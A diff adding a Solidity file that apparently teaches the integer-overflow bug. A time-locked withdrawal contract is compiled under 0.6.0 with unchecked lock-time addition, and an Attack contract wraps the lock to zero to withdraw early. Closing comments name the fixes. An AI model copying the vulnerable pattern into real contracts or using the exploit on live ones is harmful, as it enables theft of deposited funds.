@@ -1,0 +1,56 @@
+pragma solidity 0.6.0 ;
+
+contract DelayedWithdraw {
+    mapping(address => uint) public amount;
+    mapping(address => uint) public lockTime;
+
+    function deposit() external payable {
+        amount[msg.sender] += msg.value;
+        lockTime[msg.sender] = block.timestamp + 1 weeks;
+    }
+
+    function lockTimeIncrease(uint _secondsToIncrease) public {
+        lockTime[msg.sender] += _secondsToIncrease;
+    }
+
+    function withdraw() public {
+        require(amount[msg.sender] > 0, "Insufficient Balance");
+        require(block.timestamp > lockTime[msg.sender], "Lock time not completed");
+
+        uint balances = amount[msg.sender];
+        amount[msg.sender] = 0;
+
+        (bool sent, ) = msg.sender.call{value: balances}("");
+        require(sent, "Failed to send amount");
+    }
+}
+
+contract Attack {
+    DelayedWithdraw delayedWithdraw;
+
+    constructor(DelayedWithdraw  _delayedWithdraw) {
+        delayedWithdraw = DelayedWithdraw(_delayedWithdraw);
+    }
+
+    fallback() external payable {}
+
+    function attack() public payable {
+        delayedWithdraw.deposit{value: msg.value}();
+        
+        /*
+        if t = current lock time then we need to find x such that
+        x + t = 2**256 = 0 >>>> for crosing limit of uint 
+        so x = -t
+        The largest value representable by type(uint) = type(uint).max + 1
+        to cause overflow
+        */
+        
+       delayedWithdraw.lockTimeIncrease(
+            type(uint).max + 1 - delayedWithdraw.lockTime(address(this))
+        );
+        delayedWithdraw.withdraw();
+    }
+}
+
+// Using solidity version ^0.8.0 will automatically throw error in case of underflow or overflow
+// Or use SafeMath Library
